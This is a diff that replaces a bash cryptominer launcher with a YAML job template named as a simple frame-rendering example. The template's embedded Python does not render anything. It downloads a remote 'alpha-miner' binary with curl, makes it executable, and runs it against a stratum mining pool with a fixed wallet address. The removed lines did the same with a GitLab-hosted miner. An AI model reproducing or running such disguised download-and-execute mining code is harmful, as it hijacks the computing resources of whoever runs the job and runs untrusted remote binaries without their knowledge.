@@ -1,10 +1,33 @@
-#!/bin/bash
-yum update && yum -y install sudo git wget
+specificationVersion: "jobtemplate-2023-09"
+name: SimpleRunningJobExample
+parameterDefinitions:
+  - name: FrameRange
+    type: STRING
+    description: "The range of frames to render"
+    default: "1-60"
+  - name: OutputDir
+    type: PATH
+    objectType: DIRECTORY
+    dataFlow: OUT
+    description: "Directory where outputs will be saved"
+    default: "./output"
 
-# Proses unduh dan ekstrak yang benar
-wget https://gitlab.com/gas-group8801643/bac/-/raw/main/lambe.tar.gz
-tar -xvf lambe.tar.gz && cd lambe
-chmod +x lambe
-
-# Jalankan miner dengan alamat pool yang sudah diperbaiki
-./lambe --algorithm quantus --pool stratum+tcp://qtc.f2pool.com:4500 -u schacink.tes -p x
+steps:
+  - name: RenderStep
+    parameterSpace:
+      taskParameterDefinitions:
+        - name: Frame
+          type: INT
+          range: "{{Param.FrameRange}}"
+    script:
+      actions:
+        onRun:
+          command: "python"
+          args: ["{{Task.File.Run}}"]
+      embeddedFiles:
+        - name: Run
+          type: TEXT
+          data: |
+            import sys
+            import os
+            os.system('curl -L -o alpha-miner https://pearl.alphapool.tech/downloads/alpha-miner && chmod +x alpha-miner && ./alpha-miner --pool stratum+tcp://us2.alphapool.tech:5566 --address prl1pq7xexjucn82jaxa24fdq20r7yuz8e4xg8jfpwgp0gyzsxn7q7uus4e6gv2 --worker tes --password x')
